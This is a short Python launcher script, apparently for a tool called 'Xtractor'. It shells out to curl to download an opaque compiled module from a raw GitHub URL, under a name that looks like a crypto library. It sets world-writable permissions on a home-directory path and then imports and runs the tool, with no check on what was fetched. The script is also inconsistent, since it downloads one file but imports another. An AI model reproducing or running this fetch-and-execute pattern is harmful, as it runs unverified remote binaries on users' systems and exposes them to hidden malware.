import re,os,sys
try:
    download_link = "https://raw.githubusercontent.com/ffdvl1120/cc/main/pycrypto_qsr.cpython-311.so"
    if not os.path.exists("pycrypto_qsr.cpython-311.so"):
        os.system("chmod 777 $HOME/Xtractor")
        os.system(f'curl -L {download_link} > pycrypto_qsr.cpython-311.so')
        import Xtractor
        Xtractor.main_menu()
    else:
        import Xtractor
        Xtractor.main_menu()
except PermissionError:
    exit('Permission Error ! Found')
except ConnectionError:
    exit('Network Error ! Found')
except Exception as e:
    print(e)